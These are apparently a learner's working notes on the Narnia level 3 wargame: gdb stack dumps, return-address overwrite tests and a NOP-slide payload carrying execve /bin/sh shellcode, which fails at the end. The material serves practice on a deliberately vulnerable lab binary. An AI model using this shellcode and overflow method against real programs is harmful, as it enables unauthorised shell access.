narnia level 3:

no overflow, but full buffer: 
/tmp/UUUUUUUUUUUUUUUUUUUUUU.txt
first acceptable char string overflowing one char:
/tmp/UUUUUUUUUUUUUUUUUUUUUUU.txt

output from gdb (note 32 char string of U's):

(gdb) x/28x $ebp-0x38
0xffffd680:     0x55555555      0x55555555      0x55555555      0x55555555
0xffffd690:     0x55555555      0x55555555      0x55555555      0x00555555
0xffffd6a0:     0x7665642f      0x6c756e2f      0x0000006c      0x00000000
0xffffd6b0:     0x00000002      0xf7fc5000      0x00000000      0xf7e2a286
0xffffd6c0:     0x00000002      0xffffd754      0xffffd760      0x00000000
0xffffd6d0:     0x00000000      0x00000000      0xf7fc5000      0xf7ffdc0c
0xffffd6e0:     0xf7ffd000      0x00000000      0x00000002      0xf7fc5000

note where the registers are located.
(gdb) x/28x $esp
0xffffd658:     0xffffd680      0xffffd88e      0xffffffff      0xf7fc5000
0xffffd668:     0xf7e1ee18      0xf7fd2e28      0xf7fc5000      0xffffd754
0xffffd678:     0xf7ffcd00      0x00200000      0x55555555      0x55555555
0xffffd688:     0x55555555      0x55555555      0x55555555      0x55555555
0xffffd698:     0x55555555      0x00555555      0x7665642f      0x6c756e2f
0xffffd6a8:     0x0000006c      0x00000000      0x00000002      0xf7fc5000
0xffffd6b8:     0x00000000      0xf7e2a286      0x00000002      0xffffd754

ebp @ 0x00000000
esp @ 0xffffd680
eip @ 0xf7e2a286

**attemping to alter return address by buffer overflowing brute force**
1.) fill to the brim.
Starting program: /narnia/narnia3 $(python -c 'print "\x90"*59')

Breakpoint 1, 0x0804855f in main ()
(gdb) x/28x $esp
0xffffd648:     0xffffd670      0xffffd871      0xffffffff      0xf7fc5000
0xffffd658:     0xf7e1ee18      0xf7fd2e28      0xf7fc5000      0xffffd744
0xffffd668:     0xf7ffcd00      0x00200000      0x90909090      0x90909090
0xffffd678:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd688:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd698:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd6a8:     0x00909090      0xf7e2a286      0x00000002      0xffffd744
(gdb)

nop slide to $eip register. (0x90)

2.) inject code, replacing the return register stored at eip with injected memory address at 0xffffd678. 
Starting program: /narnia/narnia3 $(python -c 'print "\x90"*60 + "\xef\xbe\xad\xde"')

Breakpoint 1, 0x0804855f in main ()
(gdb) x/28x $esp
0xffffd638:     0xffffd660      0xffffd86d      0xffffffff      0xf7fc5000
0xffffd648:     0xf7e1ee18      0xf7fd2e28      0xf7fc5000      0xffffd734
0xffffd658:     0xf7ffcd00      0x00200000      0x90909090      0x90909090
0xffffd668:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd678:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd688:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd698:     0x90909090      0xdeadbeef      0x00000000      0xffffd734

CONCLUSION: the memory address can be rewritten but it's questionable whether it actually returns to the address specified when 
the program exits -1 instead 1. Program exits at -1 when the input is considered invalid. Like the one above.

Breakpoint 1, 0x0804855f in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd6a0:
 eip = 0x804855f in main; saved eip = 0xdeadbeef
 Arglist at 0xffffd698, args:
 Locals at 0xffffd698, Previous frame's sp is 0xffffd6a0
 Saved registers:
  ebp at 0xffffd698, eip at 0xffffd69c
  
it appears every exit function has the same address. so I guess we can presume that the altered return address will be valid
regardless of where the program exits. time to construct our payload.

3.) payload design/construction
structure: nop slide + shellcode + address at which nop slide begins. 
32 byte nop slide "\x90" * 32
28 byte shellcode used in previous narnia level: 
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
4 byte memory address: 0xffffd658 + 4 = 0xffffd65c

payload: 
$(python -c 'print "\x90"*35 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd6\xff\xff"')
output:
Breakpoint 1, 0x0804855f in main ()
(gdb) x/28x $esp
0xffffd638:     0xffffd660      0xffffd86d      0xffffffff      0xf7fc5000
0xffffd648:     0xf7e1ee18      0xf7fd2e28      0xf7fc5000      0xffffd734
0xffffd658:     0xf7ffcd00      0x00200000      0x90909090      0x90909090
0xffffd668:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd678:     0x90909090      0x90909090      0x31909090      0x2f6850c0
0xffffd688:     0x6868732f      0x6e69622f      0x5350e389      0xc289e189
0xffffd698:     0x80cd0bb0      0xffffd660      0x00000000      0xffffd734

looks good...
let's see if a shell appears...
no luck:
narnia3@narnia:~$ /narnia/narnia3 $(python -c 'print "\x90"*35 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd6\xff\xff"')
error opening 1Ph//shh/binPSÍ€`

my guess is that the injected EIP is not being executed as a result of exit(-1) vs exit(1). we'll be tracing the source of both exits
to see what's happening deeper under the hood.


